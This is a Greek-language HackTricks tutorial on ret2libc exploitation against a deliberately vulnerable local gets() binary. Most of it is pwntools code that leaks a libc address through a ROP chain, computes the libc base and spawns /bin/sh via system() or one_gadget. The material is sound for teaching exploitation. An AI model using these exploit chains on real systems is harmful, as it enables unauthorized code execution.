<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>


# Γρήγορη Περίληψη

1. **Βρείτε** την **απόκλιση της υπερχείλισης**
2. **Βρείτε** τα εργαλεία `POP_RDI`, `PUTS_PLT` και `MAIN_PLT`
3. Χρησιμοποιήστε τα προηγούμενα εργαλεία για να **διαρρεύσετε τη διεύθυνση μνήμης** της συνάρτησης puts ή μιας άλλης βιβλιοθήκης libc και να **βρείτε την έκδοση της libc** ([κατεβάστε την](https://libc.blukat.me))
4. Με τη βιβλιοθήκη, **υπολογίστε το ROP και εκμεταλλευτείτε το**

# Άλλα εκπαιδευτικά εγχειρίδια και δυαδικά για εξάσκηση

Αυτό το εκπαιδευτικό εγχειρίδιο θα εκμεταλλευτεί τον κώδικα/δυαδικό που προτείνεται σε αυτό το εκπαιδευτικό εγχειρίδιο: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Άλλα χρήσιμα εκπαιδευτικά εγχειρίδια: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# Κώδικας

Όνομα αρχείου: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - Πρότυπο διαρροής LIBC

Θα χρησιμοποιήσω τον κώδικα που βρίσκεται εδώ για να κάνω την εκμετάλλευση.\
Κατεβάστε την εκμετάλλευση και τοποθετήστε την στον ίδιο φάκελο με το ευπάθειας δυαδικό αρχείο και δώστε τα απαραίτητα δεδομένα στο σενάριο:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- Εύρεση της μετατόπισης

Το πρότυπο χρειάζεται μια μετατόπιση πριν συνεχίσει με την εκμετάλλευση. Αν δεν δοθεί καμία, θα εκτελέσει τον απαραίτητο κώδικα για να την βρει (από προεπιλογή `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Εκτελέστε** `python template.py` και θα ανοίξει μια κονσόλα GDB με το πρόγραμμα να καταρρέει. Μέσα σε αυτήν την **κονσόλα GDB**, εκτελέστε `x/wx $rsp` για να πάρετε τα **bytes** που θα αντικαταστήσουν το RIP. Τέλος, πάρτε την **απόσταση** χρησιμοποιώντας μια **κονσόλα python**:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

Αφού βρεθεί η απόκλιση (σε αυτήν την περίπτωση 40), αλλάξτε τη μεταβλητή OFFSET μέσα στο πρότυπο χρησιμοποιώντας αυτήν την τιμή.\
`OFFSET = "A" * 40`

Μια άλλη μέθοδος θα ήταν να χρησιμοποιήσετε: `pattern create 1000` -- _εκτέλεση μέχρι το ret_ -- `pattern search $rsp` από το GEF.

# 2- Εύρεση Gadgets

Τώρα πρέπει να βρούμε τα ROP gadgets μέσα στο δυαδικό αρχείο. Αυτά τα ROP gadgets θα είναι χρήσιμα για να καλέσουν τη συνάρτηση `puts` για να βρούν τη **libc** που χρησιμοποιείται και αργότερα για να **εκτελέσουν την τελική επίθεση**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
Το `PUTS_PLT` χρειάζεται για να καλέσει τη **συνάρτηση puts**.\
Το `MAIN_PLT` χρειάζεται για να καλέσει ξανά τη **κύρια συνάρτηση** μετά από μια αλληλεπίδραση για να **εκμεταλλευτεί** την **υπερχείλιση** ξανά (άπειρους γύρους εκμετάλλευσης). **Χρησιμοποιείται στο τέλος κάθε ROP για να καλέσει ξανά το πρόγραμμα**.\
Το **POP\_RDI** χρειάζεται για να **περάσει** ένα **παράμετρο** στην κληθείσα συνάρτηση.

Σε αυτό το βήμα δεν χρειάζεται να εκτελέσετε τίποτα, καθώς όλα θα βρεθούν από το pwntools κατά τη διάρκεια της εκτέλεσης.

# 3- Εύρεση βιβλιοθήκης LIBC

Τώρα είναι η στιγμή να βρούμε ποια έκδοση της βιβλιοθήκης **libc** χρησιμοποιείται. Για να το κάνουμε αυτό, θα **διαρρεύσουμε** τη **διεύθυνση** στη μνήμη της **συνάρτησης** `puts` και στη συνέχεια θα **αναζητήσουμε** σε ποια **έκδοση βιβλιοθήκης** βρίσκεται η έκδοση του puts σε αυτήν τη διεύθυνση.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Για να το επιτύχουμε, η πιο σημαντική γραμμή του εκτελούμενου κώδικα είναι:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Αυτό θα στείλει μερικά bytes μέχρι να είναι δυνατή η **αντικατάσταση** του **RIP**: `OFFSET`.\
Στη συνέχεια, θα ορίσει τη **διεύθυνση** του gadget `POP_RDI` έτσι ώστε η επόμενη διεύθυνση (`FUNC_GOT`) να αποθηκευτεί στον καταχωρητή **RDI**. Αυτό γίνεται επειδή θέλουμε να καλέσουμε τη συνάρτηση puts περνώντας της τη **διεύθυνση** του `PUTS_GOT` ως τη διεύθυνση στη μνήμη της συνάρτησης puts που αποθηκεύεται στη διεύθυνση που δείχνει το `PUTS_GOT`.\
Μετά από αυτό, θα κληθεί η `PUTS_PLT` (με το `PUTS_GOT` μέσα στον καταχωρητή **RDI**) έτσι ώστε η puts να **διαβάσει το περιεχόμενο** μέσα στο `PUTS_GOT` (**τη διεύθυνση της συνάρτησης puts στη μνήμη**) και να το **εκτυπώσει**.\
Τέλος, καλείται ξανά η **κύρια συνάρτηση** ώστε να μπορέσουμε να εκμεταλλευτούμε ξανά την υπερχείλιση.

Με αυτόν τον τρόπο έχουμε **εξαπατήσει τη συνάρτηση puts** να εκτυπώσει τη **διεύθυνση** στη **μνήμη** της συνάρτησης **puts** (η οποία βρίσκεται μέσα στη βιβλιοθήκη **libc**). Τώρα που έχουμε αυτήν τη διεύθυνση, μπορούμε να **αναζητήσουμε ποια έκδοση της libc χρησιμοποιείται**.

![](<../../../.gitbook/assets/image (141).png>)

Καθώς **εκμεταλλευόμαστε** ένα **τοπικό** δυαδικό αρχείο, δεν είναι **απαραίτητο** να βρούμε ποια έκδοση της **libc** χρησιμοποιείται (απλά βρείτε τη βιβλιοθήκη στο `/lib/x86_64-linux-gnu/libc.so.6`).\
Ωστόσο, σε περίπτωση εκμετάλλευσης από απόσταση, θα εξηγήσω εδώ πώς μπορείτε να το βρείτε:

## 3.1- Αναζήτηση για έκδοση της libc (1)

Μπορείτε να αναζητήσετε ποια βιβλιοθήκη χρησιμοποιείται στην ιστοσελίδα: [https://libc.blukat.me/](https://libc.blukat.me)\
Θα σας επιτρέψει επίσης να κατεβάσετε την ανακαλυφθείσα έκδοση της **libc**

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- Αναζήτηση για έκδοση της libc (2)

Μπορείτε επίσης να κάνετε:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Αυτό θα πάρει κάποιο χρόνο, να είστε υπομονετικοί.\
Για να λειτουργήσει αυτό, χρειαζόμαστε:

* Όνομα συμβόλου της libc: `puts`
* Διεύθυνση της διαρροής της libc: `0x7ff629878690`

Μπορούμε να καταλάβουμε ποια **libc** πιθανότατα χρησιμοποιείται.
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Βρίσκουμε 2 αντιστοιχίες (θα πρέπει να δοκιμάσετε τη δεύτερη αν η πρώτη δεν λειτουργεί). Κατεβάστε την πρώτη:
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Αντιγράψτε το libc από `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` στον τρέχοντα κατάλογο εργασίας μας.

## 3.3- Άλλες συναρτήσεις για διαρροή
```python
puts
printf
__libc_start_main
read
gets
```
# 4- Εύρεση βασισμένης διεύθυνσης της βιβλιοθήκης libc & εκμετάλλευση

Σε αυτό το σημείο θα πρέπει να γνωρίζουμε τη βιβλιοθήκη libc που χρησιμοποιείται. Καθώς εκμεταλλευόμαστε ένα τοπικό δυαδικό αρχείο, θα χρησιμοποιήσω απλώς: `/lib/x86_64-linux-gnu/libc.so.6`

Έτσι, στην αρχή του `template.py` αλλάξτε τη μεταβλητή **libc** σε: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Ορίστε τη διαδρομή της βιβλιοθήκης όταν την γνωρίζετε`

Δίνοντας τη **διαδρομή** προς τη **βιβλιοθήκη libc**, το υπόλοιπο της **εκμετάλλευσης θα υπολογιστεί αυτόματα**.

Μέσα στη συνάρτηση `get_addr` θα υπολογιστεί η **βασική διεύθυνση της βιβλιοθήκης libc**:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Σημείωση ότι η **τελική βάση διεύθυνσης της libc πρέπει να τελειώνει σε 00**. Αν αυτό δεν ισχύει για εσάς, μπορεί να έχετε διαρρεύσει μια εσφαλμένη βιβλιοθήκη.
{% endhint %}

Στη συνέχεια, η διεύθυνση της συνάρτησης `system` και η **διεύθυνση** του αλφαριθμητικού _"/bin/sh"_ θα υπολογιστούν από τη **βάση διεύθυνσης** της **libc** και την **δοθείσα βιβλιοθήκη libc**.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Τελικά, η εκμετάλλευση εκτέλεσης του /bin/sh θα προετοιμαστεί και θα αποσταλεί:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Ας εξηγήσουμε αυτό το τελικό ROP.\
Το τελευταίο ROP (`rop1`) τελείωσε καλώντας ξανά την κύρια συνάρτηση, οπότε μπορούμε να **εκμεταλλευτούμε ξανά** την **υπερχείλιση** (γι' αυτό είναι εδώ ξανά το `OFFSET`). Στη συνέχεια, θέλουμε να καλέσουμε το `POP_RDI` δείχνοντας στη διεύθυνση του _"/bin/sh"_ (`BINSH`) και να καλέσουμε τη συνάρτηση **system** (`SYSTEM`) επειδή η διεύθυνση του _"/bin/sh"_ θα περάσει ως παράμετρος.\
Τέλος, καλείται η **διεύθυνση της συνάρτησης exit** έτσι ώστε η διαδικασία να **τερματίσει κανονικά** και να μην παράγεται καμία ειδοποίηση.

**Με αυτόν τον τρόπο, το exploit θα εκτελέσει ένα κέλυφος **_**/bin/sh**_**.**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Χρήση ONE\_GADGET

Μπορείτε επίσης να χρησιμοποιήσετε το [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) για να αποκτήσετε ένα κέλυφος αντί να χρησιμοποιήσετε τις συναρτήσεις **system** και **"/bin/sh". ONE\_GADGET** θα βρει μέσα στη βιβλιοθήκη libc κάποιον τρόπο να αποκτήσετε ένα κέλυφος χρησιμοποιώντας μόνο μια **διεύθυνση ROP**.\
Ωστόσο, συνήθως υπάρχουν κάποιοι περιορισμοί, οι πιο κοινοί και εύκολοι να αποφευχθούν είναι όπως `[rsp+0x30] == NULL`. Καθώς έχετε έλεγχο επί των τιμών μέσα στο **RSP**, απλά πρέπει να στείλετε μερικές επιπλέον τιμές NULL ώστε να αποφευχθεί ο περιορισμός.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# ΑΡΧΕΙΟ ΕΚΜΕΤΑΛΛΕΥΣΗΣ

Μπορείτε να βρείτε ένα πρότυπο για να εκμεταλλευτείτε αυτήν την ευπάθεια εδώ:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# Συνηθισμένα προβλήματα

## MAIN\_PLT = elf.symbols\['main'] δεν βρέθηκε

Αν το σύμβολο "main" δεν υπάρχει, τότε μπορείτε απλά να βρείτε πού βρίσκεται ο κώδικας του main:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
και ορίστε τη διεύθυνση χειροκίνητα:
```python
MAIN_PLT = 0x401080
```
## Η συνάρτηση Puts δεν βρέθηκε

Εάν το δυαδικό αρχείο δεν χρησιμοποιεί τη συνάρτηση Puts, θα πρέπει να ελέγξετε εάν χρησιμοποιεί

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

Εάν βρείτε αυτό το **σφάλμα** μετά τη δημιουργία **όλων** των εκμεταλλεύσεων: `sh: 1: %s%s%s%s%s%s%s%s: not found`

Προσπαθήστε να **αφαιρέσετε 64 bytes από τη διεύθυνση του "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
